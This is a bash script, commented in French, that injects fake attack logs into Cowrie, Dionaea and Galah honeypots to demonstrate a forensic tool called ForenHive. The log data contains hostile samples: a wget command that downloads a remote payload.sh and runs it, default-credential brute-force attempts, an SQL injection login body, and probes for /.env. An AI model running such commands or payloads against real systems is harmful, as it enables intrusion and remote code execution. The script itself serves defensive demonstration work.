#!/bin/bash
# ============================================================
# ForenHive — Demo Attack Injection Script
# Injecte des logs d'attaque réalistes dans Cowrie, Dionaea, Galah
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# ── IPs de démonstration ─────────────────────────────────────
COWRIE_PRIV="192.168.1.100"
COWRIE_PUB="185.220.101.55"   # Tor exit node / scanner connu

DIONAEA_PRIV="10.10.0.200"
DIONAEA_PUB="91.92.251.103"   # Scanner malveillant connu

GALAH_PRIV="172.20.0.10"
GALAH_PUB="45.142.212.100"    # Scanner HTTP connu

NOW=$(date -u +"%Y-%m-%dT%H:%M:%S.000000Z")
NOW_DISP=$(date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+99999.000000000")
TS=$(date -u +"%Y-%m-%d %H:%M:%S")

echo ""
echo -e "${BOLD}${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${BLUE}║       ForenHive — Injection de Logs d'Attaque Demo       ║${NC}"
echo -e "${BOLD}${BLUE}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# ────────────────────────────────────────────────────────────
# ÉTAPE 1 — COWRIE (SSH/Telnet Honeypot)
# ────────────────────────────────────────────────────────────
echo -e "${YELLOW}[1/3] Injection Cowrie (SSH Honeypot)...${NC}"
echo -e "      IP Privée : ${CYAN}${COWRIE_PRIV}${NC}  |  IP Publique : ${CYAN}${COWRIE_PUB}${NC}"

docker exec -i forenhive-cowrie python3 - <<PYEOF
import json, uuid, time
from datetime import datetime, timezone, timedelta

log_path = '/cowrie/cowrie-git/var/log/cowrie/cowrie.json'

def ts(offset_sec=0):
    t = datetime.now(timezone.utc) + timedelta(seconds=offset_sec)
    return t.strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'

def sid():
    return uuid.uuid4().hex[:12]

sensor = 'forenhive-cowrie'

events = []

# === IP PUBLIQUE : 185.220.101.55 (Tor exit / scanner) ===
s1 = sid()
events += [
    {"eventid":"cowrie.session.connect","src_ip":"185.220.101.55","src_port":58421,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s1,"protocol":"ssh",
     "message":"New connection: 185.220.101.55:58421 (172.16.1.100:22) [session: "+s1+"]",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(0)},

    {"eventid":"cowrie.login.failed","src_ip":"185.220.101.55","src_port":58421,
     "session":s1,"protocol":"ssh","username":"root","password":"123456",
     "message":"login attempt [root/123456] failed","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(1)},

    {"eventid":"cowrie.login.failed","src_ip":"185.220.101.55","src_port":58421,
     "session":s1,"protocol":"ssh","username":"admin","password":"admin",
     "message":"login attempt [admin/admin] failed","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(2)},

    {"eventid":"cowrie.login.success","src_ip":"185.220.101.55","src_port":58421,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s1,"protocol":"ssh",
     "username":"root","password":"toor",
     "message":"login attempt [root/toor] succeeded","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(3)},

    {"eventid":"cowrie.command.input","src_ip":"185.220.101.55","src_port":58421,
     "session":s1,"protocol":"ssh",
     "message":"CMD: uname -a","input":"uname -a","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(4)},

    {"eventid":"cowrie.command.input","src_ip":"185.220.101.55","src_port":58421,
     "session":s1,"protocol":"ssh",
     "message":"CMD: wget http://185.220.101.55/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh",
     "input":"wget http://185.220.101.55/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(5)},

    {"eventid":"cowrie.session.closed","src_ip":"185.220.101.55","src_port":58421,
     "session":s1,"protocol":"ssh","duration":14.32,
     "message":"Connection lost after 14 seconds","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(15)},
]

# === IP PRIVÉE : 192.168.1.100 (réseau interne) ===
s2 = sid()
events += [
    {"eventid":"cowrie.session.connect","src_ip":"192.168.1.100","src_port":34902,
     "dst_ip":"172.16.1.100","dst_port":22,"session":s2,"protocol":"ssh",
     "message":"New connection: 192.168.1.100:34902 (172.16.1.100:22) [session: "+s2+"]",
     "sensor":sensor,"uuid":str(uuid.uuid4()),"timestamp":ts(20)},

    {"eventid":"cowrie.login.failed","src_ip":"192.168.1.100","src_port":34902,
     "session":s2,"protocol":"ssh","username":"ubuntu","password":"ubuntu",
     "message":"login attempt [ubuntu/ubuntu] failed","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(21)},

    {"eventid":"cowrie.login.failed","src_ip":"192.168.1.100","src_port":34902,
     "session":s2,"protocol":"ssh","username":"pi","password":"raspberry",
     "message":"login attempt [pi/raspberry] failed","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(22)},

    {"eventid":"cowrie.login.failed","src_ip":"192.168.1.100","src_port":34902,
     "session":s2,"protocol":"ssh","username":"vagrant","password":"vagrant",
     "message":"login attempt [vagrant/vagrant] failed","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(23)},

    {"eventid":"cowrie.session.closed","src_ip":"192.168.1.100","src_port":34902,
     "session":s2,"protocol":"ssh","duration":3.11,
     "message":"Connection lost after 3 seconds","sensor":sensor,
     "uuid":str(uuid.uuid4()),"timestamp":ts(24)},
]

with open(log_path, 'a') as f:
    for e in events:
        f.write(json.dumps(e) + '\n')

print(f'  Injecte {len(events)} evenements Cowrie dans {log_path}')
PYEOF

echo -e "  ${GREEN}✓ Cowrie — ${COWRIE_PUB} (6 events: connect+bruteforce+RCE) + ${COWRIE_PRIV} (5 events: bruteforce)${NC}"
echo ""

# ────────────────────────────────────────────────────────────
# ÉTAPE 2 — DIONAEA (Multi-protocole Honeypot)
# ────────────────────────────────────────────────────────────
echo -e "${YELLOW}[2/3] Injection Dionaea (SMB/SQL/FTP Honeypot)...${NC}"
echo -e "      IP Privée : ${CYAN}${DIONAEA_PRIV}${NC}  |  IP Publique : ${CYAN}${DIONAEA_PUB}${NC}"

docker exec forenhive-dionaea sh -c "
cat >> /opt/dionaea/var/log/dionaea/dionaea.log << 'EOF'
connection accepted from 91.92.251.103:49832 to 172.16.1.100:445
connection accepted from 91.92.251.103:49833 to 172.16.1.100:445
connection accepted from 91.92.251.103:52144 to 172.16.1.100:1433
connection accepted from 91.92.251.103:52145 to 172.16.1.100:3306
connection accepted from 91.92.251.103:52200 to 172.16.1.100:80
connection accepted from 10.10.0.200:61001 to 172.16.1.100:445
connection accepted from 10.10.0.200:61002 to 172.16.1.100:445
connection accepted from 10.10.0.200:61100 to 172.16.1.100:1433
EOF
echo 'OK: 8 lignes injectees dans dionaea.log'
"

echo -e "  ${GREEN}✓ Dionaea — ${DIONAEA_PUB} (SMB+MSSQL+MySQL+HTTP) + ${DIONAEA_PRIV} (SMB+MSSQL)${NC}"
echo ""

# ────────────────────────────────────────────────────────────
# ÉTAPE 3 — GALAH (HTTP Honeypot LLM)
# ────────────────────────────────────────────────────────────
echo -e "${YELLOW}[3/3] Injection Galah (HTTP/LLM Honeypot)...${NC}"
echo -e "      IP Privée : ${CYAN}${GALAH_PRIV}${NC}  |  IP Publique : ${CYAN}${GALAH_PUB}${NC}"

GALAH_TS1=$(date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11111.000000000")
GALAH_TS2=$(date -u -d '+2 seconds' +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11113.000000000" 2>/dev/null || date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11113.000000000")
GALAH_TS3=$(date -u -d '+4 seconds' +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11115.000000000" 2>/dev/null || date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11115.000000000")
GALAH_TS4=$(date -u -d '+6 seconds' +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11117.000000000" 2>/dev/null || date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11117.000000000")
GALAH_TS5=$(date -u -d '+8 seconds' +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11119.000000000" 2>/dev/null || date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11119.000000000")
GALAH_TS6=$(date -u -d '+10 seconds' +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11121.000000000" 2>/dev/null || date -u +"%Y-%m-%d %H:%M:%S.000000000 +0000 UTC m=+11121.000000000")

docker exec forenhive-galah sh -c "
cat >> /app/logs/event_log.json << EOF
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\",\"headers\":{\"User-Agent\":\"Nuclei - Open-source project\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"aaa\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/wp-admin/\",\"sessionID\":\"demo_sess_001\",\"userAgent\":\"Nuclei - Open-source project\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html; charset=UTF-8\",\"Server\":\"Apache/2.4.29 (Ubuntu)\"},\"body\":\"<html><title>WP Admin</title></html>\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${GALAH_TS1}\",\"srcIP\":\"45.142.212.100\",\"srcHost\":\"\",\"srcPort\":\"52301\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\",\"headers\":{\"User-Agent\":\"Nuclei - Open-source project\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"bbb\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/phpmyadmin/\",\"sessionID\":\"demo_sess_001\",\"userAgent\":\"Nuclei - Open-source project\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"nginx/1.18.0\"},\"body\":\"<html><title>phpMyAdmin</title></html>\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${GALAH_TS2}\",\"srcIP\":\"45.142.212.100\",\"srcHost\":\"\",\"srcPort\":\"52302\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"username=admin'+OR+'1'%3D'1&password=x\",\"bodySha256\":\"ccc\",\"headers\":{\"User-Agent\":\"sqlmap/1.7\",\"Content-Type\":\"application/x-www-form-urlencoded\"},\"headersSorted\":\"Content-Type,User-Agent\",\"headersSortedSha256\":\"ddd\",\"method\":\"POST\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/login.php\",\"sessionID\":\"demo_sess_002\",\"userAgent\":\"sqlmap/1.7\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"Apache/2.4.29 (Ubuntu)\"},\"body\":\"<html><title>Login</title><body>Welcome admin!</body></html>\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${GALAH_TS3}\",\"srcIP\":\"45.142.212.100\",\"srcHost\":\"\",\"srcPort\":\"52303\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\",\"headers\":{\"User-Agent\":\"Mozilla/5.0\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"eee\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/api/v1/users\",\"sessionID\":\"demo_sess_003\",\"userAgent\":\"Mozilla/5.0\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"application/json\",\"Server\":\"Apache/2.4.29 (Ubuntu)\"},\"body\":\"{\\\"users\\\":[{\\\"id\\\":1,\\\"name\\\":\\\"admin\\\"}]}\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${GALAH_TS4}\",\"srcIP\":\"172.20.0.10\",\"srcHost\":\"\",\"srcPort\":\"43201\",\"tags\":null}
{\"level\":\"info\",\"msg\":\"successfulResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8080\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\",\"headers\":{\"User-Agent\":\"Mozilla/5.0\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"fff\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/.env\",\"sessionID\":\"demo_sess_004\",\"userAgent\":\"Mozilla/5.0\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/plain\",\"Server\":\"Apache/2.4.29 (Ubuntu)\"},\"body\":\"DB_PASSWORD=secret123\"},\"responseMetadata\":{\"generationSource\":\"llm\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${GALAH_TS5}\",\"srcIP\":\"172.20.0.10\",\"srcHost\":\"\",\"srcPort\":\"43202\",\"tags\":null}
{\"level\":\"error\",\"msg\":\"failedResponse\",\"sensorName\":\"forenhive-demo\",\"port\":\"8888\",\"httpRequest\":{\"body\":\"\",\"bodySha256\":\"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\",\"headers\":{\"User-Agent\":\"ZGrab\"},\"headersSorted\":\"User-Agent\",\"headersSortedSha256\":\"ggg\",\"method\":\"GET\",\"protocolVersion\":\"HTTP/1.1\",\"request\":\"/\",\"sessionID\":\"demo_sess_005\",\"userAgent\":\"ZGrab\"},\"httpResponse\":{\"headers\":{\"Content-Type\":\"text/html\",\"Server\":\"nginx\"},\"body\":\"<html>Hello</html>\"},\"responseMetadata\":{\"generationSource\":\"cache\",\"info\":{\"model\":\"mistral\",\"provider\":\"ollama\",\"temperature\":1}},\"eventTime\":\"${GALAH_TS6}\",\"srcIP\":\"172.20.0.10\",\"srcHost\":\"\",\"srcPort\":\"43210\",\"tags\":null}
EOF
echo 'OK: 6 lignes injectees dans event_log.json'
"

echo -e "  ${GREEN}✓ Galah — ${GALAH_PUB} (wp-admin+phpmyadmin+SQLi) + ${GALAH_PRIV} (API scan+.env)${NC}"
echo ""

# ────────────────────────────────────────────────────────────
# RÉSUMÉ
# ────────────────────────────────────────────────────────────
echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${GREEN}║              Injection terminée avec succès !            ║${NC}"
echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BOLD}IPs injectées :${NC}"
echo -e "  Cowrie  │ Privée: ${CYAN}${COWRIE_PRIV}${NC}   │ Publique: ${CYAN}${COWRIE_PUB}${NC} (Tor exit)"
echo -e "  Dionaea │ Privée: ${CYAN}${DIONAEA_PRIV}${NC}  │ Publique: ${CYAN}${DIONAEA_PUB}${NC} (scanner)"
echo -e "  Galah   │ Privée: ${CYAN}${GALAH_PRIV}${NC}  │ Publique: ${CYAN}${GALAH_PUB}${NC} (scanner HTTP)"
echo ""
echo -e "${YELLOW}Attends 15-30 secondes puis lance : ${BOLD}bash demo_verify.sh${NC}"
echo ""
